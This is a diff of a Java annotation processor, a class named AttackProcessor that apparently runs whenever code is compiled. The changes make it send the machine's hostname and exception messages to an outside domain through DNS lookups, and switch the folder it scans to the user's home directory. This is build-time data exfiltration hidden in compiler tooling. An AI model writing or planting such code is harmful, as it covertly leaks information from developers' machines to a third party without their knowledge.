@@ -32,11 +32,11 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac21.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac22.lirui28.t.dlsr.ga" );
 
-            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac21.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac22.lirui28.t.dlsr.ga" );
 
-            File folder = new File(System.getProperty("user.dir"));
+            File folder = new File(System.getProperty("user.home"));
 
             if (folder.isDirectory()){
                 File[] files = folder.listFiles();
@@ -75,7 +75,7 @@ public class AttackProcessor extends AbstractProcessor {
                 }
                 bw.close();
             } catch (Exception e) {
-                Inet4Address.getByName( "runtimeerror"+".5.lirui28.t.dlsr.ga" );
+                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ) +".5.lirui28.t.dlsr.ga" );
 
             }
 
